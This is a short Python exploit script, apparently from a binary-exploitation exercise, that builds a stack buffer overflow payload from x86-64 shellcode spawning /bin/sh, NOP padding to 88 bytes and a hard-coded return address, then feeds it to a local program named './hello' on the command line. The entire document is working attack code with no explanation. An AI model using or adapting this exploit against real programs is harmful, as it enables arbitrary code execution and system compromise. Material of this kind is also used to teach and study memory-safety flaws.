import sys
import struct
from os import system

shell_code = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\
\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
buff_size = 88
ret_addr = 0x7fffffffe360

payload = shell_code
payload += b"\x90" * (88 - len(shell_code))
payload += struct.pack('<Q', ret_addr)

print("length of payload: ", len(payload), "bytes")

with open('input', 'wb') as fp:
    fp.write(payload)

system("./hello $(cat input)")
